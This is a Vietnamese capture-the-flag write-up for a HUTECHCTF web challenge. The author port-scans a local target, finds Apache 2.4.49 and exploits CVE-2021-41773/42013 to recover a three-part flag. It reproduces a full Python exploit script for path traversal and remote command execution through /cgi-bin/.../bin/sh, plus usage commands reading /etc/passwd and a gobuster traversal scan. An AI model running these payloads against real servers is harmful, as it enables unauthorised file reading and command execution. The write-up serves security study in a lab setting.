# SAFE WEB
<img width="2795" height="1185" alt="image-41" src="https://github.com/user-attachments/assets/73eaaf5e-c81e-4539-8c56-82bb22819fa3" />


Đầu tiên khi mới vào và thấy rất nhiều chức năng và có cả endpoint /admin nữa nhưng theo gợi ý đề bài và tên bài ```trang web này không có lỗ hỏng```
Ban đầu mình cũng không tin và test nát cái trang này nhưng đúng là nó không có lỗ hỏng thật vậy chúng ta phải làm như nào.

### Solution
- thật ra 1 host có thể có nhiều port khác nhau, nếu như trang web với host và port như hiện tại không có lỗ hỏng, biết đâu trên port khác của cái host này nó có lổ hỏng thì sao vậy chúng ta phải đi kiếm ```New attack surface```(bề mặt tấn công mới)

mình sẽ dùng nmap([text](https://nmap.org/)) để tra xem có port nào đang mở:

mình dùng: ```nmap -sV -O -T4 localhost -p 0-11000```
```
-sV: Thăm dò các cổng mở để xác định thông tin dịch vụ/phiên bản
-O: Bật phát hiện hệ điều hành
-T4: Đặt mẫu thời gian (cao hơn là nhanh hơn)
localhost: host trang web mà bạn muốn test
-p 0-11000: quét từ cổng 0 tới 11000
```
sau khi quét nó ra:
<img width="1080" height="162" alt="image-42" src="https://github.com/user-attachments/assets/62cd58cf-d66e-4fa7-ad8e-1da6613882d7" />


chúng ta phát hiện 1 port mới là 10000 với version khá cũ là 2.4.49 hãy vào port này thử
<img width="1064" height="514" alt="image-43" src="https://github.com/user-attachments/assets/b3004f05-9086-42e6-97c5-941a75ad1688" />


có vẻ như trang web này bị lỗi và có 1 link troll nhưng để ý kĩ 1 tí nó trả về 200 mà chứ có lỗi như web nói đâu, vậy là nghi nghi ở đây

tiếp theo mình thử research port của trang web này là 10000 và xem có gì khai thác được không.

<img width="978" height="744" alt="image-44" src="https://github.com/user-attachments/assets/df2774a3-451a-4700-949b-96d1f8cac19e" />


Ôi mình thấy cả CVE([CVE](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)) cho cái port này 
Vậy nó có thể dính CVE-2021-41773 & CVE-2021-42013

thử trang web trên chúng ta được 1 script python để khai thác như sau:
```
# !/usr/bin/python3
# Author: Ravin | Blacknote
# CVE-2021-41773 | CVE-2021-42013
# Apache HTTP Server 2.4.49-2.4.50 - Path Traversal & Remote Code Execution

# Usage: 
# python3 exploit.py 127.0.0.1 8080 rce 'id'
# python3 exploit.py 127.0.0.1 8080 file '/etc/passwd'

# Reference(s):
# https://www.picussecurity.com/resource/blog/simulate-apache-cve-2021-41773-exploits-vulnerability

import argparse
import requests as req


# Path Traversal
payload1="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
# Path Traversal
payload2="/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
# RCE
payload3="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"


url = ""

def check(url):
    res = req.get(url)
    server = res.headers.get('Server')

    if "Apache/2.4.49" or "Apache/2.4.50" in server:
        print("[i] Host appears to be vulnerable.")
        
    else:
        print("[i] Host might not be vulnerable.")
        force = input("[!] Do you still want to run the exploit? (y/n): ")
        if force.lower() == "n":
            exit(0)

            

def rce(url, cmd):

    payload_url=f"{url}{payload3}"
    data = f"echo Content-Type: text/plain; echo; {cmd}"
    s = req.Session()
    r = req.Request('POST', payload_url, data=data).prepare()
    r.url = payload_url
    resp = s.send(r)
    if resp.status_code == 200:
        print("[*] Working Payload: " + payload_url + "\n")
        print(f"$ {cmd}")
        print((resp.content).decode('utf-8', errors='ignore'))
        while 1:
            cmd = input("$ ")
            if cmd =='exit':
                    exit(0)
            else:
                data = f"echo Content-Type: text/plain; echo; {cmd}"
                s = req.Session()
                r = req.Request('POST', payload_url, data=data).prepare()
                r.url = payload_url
                resp = s.send(r)
                print((resp.content).decode('utf-8', errors='ignore'))
    else:
        print("[!] Host seems to be patched.")
        exit(0)         

def traversal(url, file):
  
    payloads = [payload1, payload2]
    
    for i in payloads:
        payload_url=f"{url}{i}{file}"
        s = req.Session()
        r = req.Request('GET', payload_url).prepare()
        r.url = payload_url
        resp = s.send(r)
        if resp.status_code == 200:
            print("[*] Working payload: " + f"{url}{i}" + "/path/to/file\n")
            print((resp.content).decode('utf-8', errors='ignore') + "\n")
            while 1:
                file = input("File (Absolute Path)> ")
                if file =='exit':
                    exit(0)
                else:
                    payload_url=f"{url}{i}{file}"
                    s = req.Session()
                    r = req.Request('GET', payload_url).prepare()
                    r.url = payload_url
                    resp = s.send(r)
                    print((resp.content).decode('utf-8', errors='ignore') + "\n")
        elif i==payload2 and resp.status_code != 200:
            print("[!] Host seems to be patched.")
            exit(0)

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-41773 & CVE-2021-42013")
    parser.add_argument("rhost")
    parser.add_argument("rport")
    parser.add_argument("opt")
    parser.add_argument("cmd")

    args = parser.parse_args()

    if "http://" or "https://" not in args.rhost:
        url = f"http://{args.rhost}:{args.rport}"
        
    else:
        url = f"{args.rhost}:{args.rport}"

    check(url)

    if "rce" in (args.opt).lower():
        rce(url, args.cmd)
    elif "file" in (args.opt).lower():
        traversal(url, args.cmd)
    else:
        print("[!] Invalid Option!")
        exit(0)

if __name__ == '__main__':
    main()
```

hướng dẫn sử dụng cũng có
đối với RCE:
```
python3 exploit.py 127.0.0.1 8080 rce 'id'
```
đối với LFI:
```
python3 exploit.py 127.0.0.1 8080 file '/etc/passwd'
```
ok thử RCE xem

<img width="2483" height="844" alt="image-45" src="https://github.com/user-attachments/assets/d90bcc95-d567-463e-a021-5c1fab1d185d" />


ok tuy không RCE được nhưng với output trả về thì chắc chắc là nó dính CVE

tiếp đến hãy thử LFI
<img width="2121" height="866" alt="image-46" src="https://github.com/user-attachments/assets/85968827-f826-4f9e-bf54-dbcb9fd83797" />


tuyệt vời ta đã lấy được phần đầu tiên sau khi decode base64:
```HUTECHCTF{Finally_you```

Vậy các phần còn lại ở đâu ??
sau khi mình mò rất nhiều file và không thể tìm được các phần còn lại của flag mình bắt buộc phải dùng tool để kiếm các file trả về status 200. => tối ưu hóa thời gian

mình sẽ dùng wordlist ở ```usr/share/wordlists/seclists/Fuzzing/LFI/```
file wordlist mình dùng là ```LFI-etc-files-of-all-linux-packages.txt```

tool mình dùng là gobuster([help](https://www.kali.org/tools/gobuster/)), mình sẽ quét xem file nào trả về content 200 thì lấy 
```
gobuster dir -u http://localhost:10000/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt
```

<img width="2569" height="1159" alt="image-47" src="https://github.com/user-attachments/assets/2f96bf63-0ce2-4983-abfa-9f8e8a0966c6" />

có rất nhiều file trả về 200 và mình thử từng cái và part 2 là
<img width="1796" height="668" alt="image-48" src="https://github.com/user-attachments/assets/af348253-64d3-411a-a422-4326fd9f22d1" />

Part 2: ```_can_find_flag_```

part cuối là:
<img width="1837" height="672" alt="image-49" src="https://github.com/user-attachments/assets/ce3dd511-a79e-4b10-91cc-180082fc20e4" />

Part 3: ```hahaahahahahaha!}```

Problem solved: ```HUTECHCTF{Finally_you_can_find_flag_hahaahahahahaha!}```



